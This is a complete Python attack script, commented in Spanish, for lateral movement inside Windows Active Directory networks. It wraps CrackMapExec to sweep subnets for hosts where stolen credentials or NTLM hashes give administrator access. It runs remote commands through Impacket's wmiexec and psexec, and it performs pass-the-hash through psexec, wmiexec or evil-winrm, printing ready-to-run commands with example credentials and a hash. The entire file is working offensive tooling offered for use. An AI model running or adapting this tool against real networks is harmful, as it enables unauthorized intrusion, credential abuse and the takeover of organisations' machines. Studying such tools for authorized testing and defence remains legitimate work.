#!/usr/bin/env python3
"""
lateral_move.py — Movimiento lateral en Active Directory
MITRE ATT&CK: T1550.002 (PTH) · T1021.002 (SMB) · T1021.006 (WinRM)

Uso:
    # Escanear qué hosts son accesibles con las credenciales actuales
    python3 lateral_move.py scan --dc 192.168.1.10 --domain empresa.local \
        -u Administrador -p "Admin123!" --range 192.168.1.0/24

    # Ejecutar comando remoto en un host
    python3 lateral_move.py exec --target 192.168.1.41 --domain empresa.local \
        -u Administrador -p "Admin123!" --cmd "whoami"

    # Pass-the-Hash
    python3 lateral_move.py pth --target 192.168.1.41 --domain empresa.local \
        -u Administrador --hash "31d6cfe0d16ae931b73c59d7e0c089c0"
"""

import argparse
import subprocess
import sys


class C:
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

def ok(m):   print(C.GREEN  + "  [+] " + C.RESET + m)
def info(m): print(C.BLUE   + "  [*] " + C.RESET + m)
def warn(m): print(C.YELLOW + "  [!] " + C.RESET + m)
def err(m):  print(C.RED    + "  [-] " + C.RESET + m)
def crit(m): print(C.RED + C.BOLD + "  [PWNED] " + C.RESET + m)


def banner():
    print(C.CYAN + C.BOLD + """
  ╔══════════════════════════════════════════════════╗
  ║   LATERAL MOVE — SMB / WMI / PTH                 ║
  ╚══════════════════════════════════════════════════╝
""" + C.RESET)


def cmd_scan(args):
    """Escanea la red buscando hosts accesibles con las credenciales dadas."""
    info("Escaneando: " + args.range)
    info("Credenciales: " + args.domain + "/" + args.user)
    print()

    cmd = [
        "crackmapexec", "smb", args.range,
        "-u", args.user,
        "-d", args.domain,
        "--continue-on-success",
    ]

    if args.password:
        cmd += ["-p", args.password]
    elif args.hash:
        cmd += ["-H", args.hash]

    try:
        result = subprocess.run(cmd, text=True, capture_output=True)
        output = result.stdout + result.stderr
        print(output)

        owned  = [l for l in output.split("\n") if "(Pwn3d!)" in l]
        valid  = [l for l in output.split("\n") if "[+]" in l and "(Pwn3d!)" not in l]

        if owned:
            print()
            crit("Hosts con acceso de ADMINISTRADOR:")
            for h in owned:
                crit(h.strip())
        if valid:
            print()
            ok("Hosts con acceso de usuario:")
            for h in valid:
                ok(h.strip())

        if not owned and not valid:
            warn("No se encontro acceso con estas credenciales en la red")

    except FileNotFoundError:
        err("CrackMapExec no encontrado: apt install crackmapexec")


def cmd_exec(args):
    """Ejecuta un comando remoto en el objetivo."""
    info("Objetivo: " + args.target)
    info("Comando: " + args.cmd)
    print()

    # Intentar con WMIExec primero (mas silencioso que PSExec)
    info("Intentando via WMIExec...")
    creds = args.domain + "/" + args.user
    if args.password:
        creds += ":'" + args.password + "'"
    target_str = "@" + args.target

    cmd_wmi = ["impacket-wmiexec", creds + target_str, args.cmd]

    try:
        result = subprocess.run(cmd_wmi, text=True, capture_output=True, timeout=30)
        if result.returncode == 0 or result.stdout:
            ok("Ejecucion exitosa via WMIExec:")
            print(result.stdout)
        else:
            warn("WMIExec fallo, intentando PSExec...")
            cmd_ps = ["impacket-psexec", creds + target_str, args.cmd]
            result2 = subprocess.run(cmd_ps, text=True, capture_output=True, timeout=30)
            print(result2.stdout or result2.stderr)
    except FileNotFoundError:
        err("Impacket no encontrado: pip install impacket")
    except subprocess.TimeoutExpired:
        warn("Timeout — el objetivo puede estar filtrando conexiones")


def cmd_pth(args):
    """Pass-the-Hash — autenticacion con hash NTLM sin contrasena."""
    info("Pass-the-Hash")
    info("Objetivo: " + args.target)
    info("Usuario:  " + args.domain + "/" + args.user)
    info("Hash:     " + args.hash[:8] + "..." + args.hash[-8:])
    print()

    print(C.BOLD + "  Opciones de acceso con PTH:" + C.RESET)
    print()
    print("  1. PSExec (shell SYSTEM):")
    print("     impacket-psexec " + args.domain + "/" + args.user + "@" +
          args.target + " -hashes :" + args.hash)
    print()
    print("  2. WMIExec (mas silencioso):")
    print("     impacket-wmiexec " + args.domain + "/" + args.user + "@" +
          args.target + " -hashes :" + args.hash)
    print()
    print("  3. Evil-WinRM (WinRM, puerto 5985):")
    print("     evil-winrm -i " + args.target + " -u " + args.user +
          " -H " + args.hash)
    print()
    print("  4. CrackMapExec (verificar acceso):")
    print("     crackmapexec smb " + args.target + " -u " + args.user +
          " -H " + args.hash + " -d " + args.domain)
    print()

    if args.method:
        info("Ejecutando con metodo: " + args.method)
        if args.method == "psexec":
            subprocess.run([
                "impacket-psexec",
                args.domain + "/" + args.user + "@" + args.target,
                "-hashes", ":" + args.hash
            ])
        elif args.method == "wmiexec":
            subprocess.run([
                "impacket-wmiexec",
                args.domain + "/" + args.user + "@" + args.target,
                "-hashes", ":" + args.hash
            ])
        elif args.method == "evil-winrm":
            subprocess.run([
                "evil-winrm", "-i", args.target,
                "-u", args.user, "-H", args.hash
            ])


def parse_args():
    p = argparse.ArgumentParser(description="lateral_move.py — Movimiento lateral AD")
    sub = p.add_subparsers(dest="command", required=True)

    # scan
    sc = sub.add_parser("scan", help="Escanear red con credenciales")
    sc.add_argument("--range",    required=True, help="Rango CIDR (ej: 192.168.1.0/24)")
    sc.add_argument("--domain",   required=True)
    sc.add_argument("-u", "--user",     required=True)
    sc.add_argument("-p", "--password", default=None)
    sc.add_argument("-H", "--hash",     default=None)
    sc.add_argument("--dc",       default=None)

    # exec
    ex = sub.add_parser("exec", help="Ejecutar comando remoto")
    ex.add_argument("--target",   required=True)
    ex.add_argument("--domain",   required=True)
    ex.add_argument("-u", "--user",     required=True)
    ex.add_argument("-p", "--password", default=None)
    ex.add_argument("-H", "--hash",     default=None)
    ex.add_argument("--cmd",      default="whoami")

    # pth
    pt = sub.add_parser("pth", help="Pass-the-Hash")
    pt.add_argument("--target",  required=True)
    pt.add_argument("--domain",  required=True)
    pt.add_argument("-u", "--user",  required=True)
    pt.add_argument("--hash",    required=True, help="Hash NTLM (solo la parte NT)")
    pt.add_argument("--method",  choices=["psexec","wmiexec","evil-winrm"], default=None)

    return p.parse_args()


def main():
    banner()
    args = parse_args()
    if args.command == "scan": cmd_scan(args)
    elif args.command == "exec": cmd_exec(args)
    elif args.command == "pth": cmd_pth(args)

if __name__ == "__main__":
    main()
